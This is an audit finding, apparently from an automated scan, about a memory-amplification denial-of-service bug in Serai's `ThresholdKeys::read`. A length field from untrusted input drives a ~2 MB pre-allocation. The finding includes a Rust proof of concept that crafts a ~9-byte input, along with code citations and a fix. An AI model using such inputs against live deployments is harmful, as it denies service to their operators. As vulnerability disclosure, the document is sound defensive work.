### Title
Attacker-controlled participant count in `ThresholdKeys::read` causes disproportionate memory allocation (DoS) - ([File: crypto/dkg/src/lib.rs](crypto/dkg/src/lib.rs))

### Summary
The external report (CVE-2023-22740) describes "Allocation of Resources Without Limits": a length field controlled by an unprivileged user drives a server-side allocation far larger than the input supplied. The same class exists in Serai's `ThresholdKeys::read` (`crypto/dkg/src/lib.rs`), where a single attacker-controlled `u16` (`n`) is used to pre-allocate a `Vec` of field elements before any of those elements are actually read from the stream.

### Finding Description
`ThresholdKeys::read` deserializes `(t, n, i)` as three little-endian `u16`s, then reads an interpolation-method tag. For `Interpolation::Constant`, it does `Vec::with_capacity(usize::from(n))` and then attempts to read `n` scalars [1](#0-0) . `n` is attacker-controlled up to `65535`, so the `with_capacity` reserves ~2 MB (65535 × 32-byte `C::F` slots) after the attacker supplies only ~9 bytes of input. Even though the subsequent `read_F` calls fail on a short input, the oversized allocation has already been performed — an input-to-allocation amplification of roughly 2×10⁵× per call, repeatable at will by an unprivileged caller feeding bytes to `ThresholdKeys::read`.

This is not merely theoretical: per the scan scope, `ThresholdKeys::read` is an API intended to consume untrusted bytes. Other in-scope deserializers were checked and found not vulnerable to amplification — `SchnorrAggregate::read` grows `Rs` incrementally bounded by bytes actually present [2](#0-1) , and PedPoP's `Commitments::read` sizes its allocation from integrator-set `params.t()`, not from the wire [3](#0-2) . `ThresholdKeys::read` is the one place where a wire-derived length triggers an eager allocation.

### Impact Explanation
Repeated `ThresholdKeys::read` calls on tiny crafted inputs (each ~9 bytes) force ~2 MB transient allocations per call. An attacker can issue many calls in parallel/sequence to exhaust memory or trigger allocator pressure/OOM, denying service — the same denial-of-service class as the Discourse advisory. Severity: Medium (availability impact only; no correctness or key compromise).

### Likelihood Explanation
Any deployment that exposes `ThresholdKeys` deserialization to network input (key backup/restore, share transport, coordinator sync) is reachable. The precondition is trivial: provide bytes for the curve ID check to pass, then set `n = 0xffff` and interpolation byte `0` and truncate the stream. No authentication or valid cryptographic material is required to reach the allocation.

### Recommendation
Do not pre-allocate from the untrusted `n`. Either push scalars as they are read (allocation proportional to bytes present, as `SchnorrAggregate::read` does), or cap `n` against a protocol maximum before `with_capacity` in `ThresholdKeys::read`. Optionally reject `Constant` interpolations whose `n` exceeds `t`/`n` sanity bounds already enforced later by `ThresholdParams::new`.

### Proof of Concept
```rust
use std::io;
use ciphersuite::{Ciphersuite, Ristretto};
use dkg::ThresholdKeys;

fn main() -> io::Result<()> {
  let mut buf = vec![];
  // C::ID length + C::ID for Ristretto
  let id = <Ristretto as Ciphersuite>::ID;
  buf.extend((id.len() as u32).to_le_bytes());
  buf.extend(id);
  // t = 1, i = 1
  buf.extend(1u16.to_le_bytes());
  // n = u16::MAX -> drives Vec::with_capacity(65535) for C::F scalars (~2 MB)
  buf.extend(u16::MAX.to_le_bytes());
  buf.extend(1u16.to_le_bytes());
  // Interpolation::Constant
  buf.push(0u8);
  // Stream ends here: read_F fails, but the ~2 MB capacity was already reserved.
  let res = ThresholdKeys::<Ristretto>::read(&mut buf.as_slice());
  assert!(res.is_err());
  Ok(())
}
```

Caveat: the amplification is bounded by `u16::MAX` (~2 MB per call), so exploitability depends on the attacker being able to invoke `ThresholdKeys::read` repeatedly; deployments that only deserialize `ThresholdKeys` from trusted local storage are not affected.

### Citations

**File:** crypto/dkg/src/lib.rs (L591-616)
```rust
    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };
```

**File:** crypto/schnorr/src/aggregate.rs (L77-88)
```rust
  pub fn read<R: Read>(reader: &mut R) -> io::Result<Self> {
    let mut len = [0; 4];
    reader.read_exact(&mut len)?;

    #[allow(non_snake_case)]
    let mut Rs = vec![];
    for _ in 0 .. u32::from_le_bytes(len) {
      Rs.push(C::read_G(reader)?);
    }

    Ok(SchnorrAggregate { Rs, s: C::read_F(reader)? })
  }
```

**File:** crypto/dkg/pedpop/src/lib.rs (L110-127)
```rust
  fn read<R: Read>(reader: &mut R, params: ThresholdParams) -> io::Result<Self> {
    let mut commitments = Vec::with_capacity(params.t().into());
    let mut cached_msg = vec![];

    #[allow(non_snake_case)]
    let mut read_G = || -> io::Result<C::G> {
      let mut buf = <C::G as GroupEncoding>::Repr::default();
      reader.read_exact(buf.as_mut())?;
      let point = C::read_G(&mut buf.as_ref())?;
      cached_msg.extend(buf.as_ref());
      Ok(point)
    };

    for _ in 0 .. params.t() {
      commitments.push(read_G()?);
    }

    Ok(Commitments { commitments, cached_msg, sig: SchnorrSignature::read(reader)? })
```
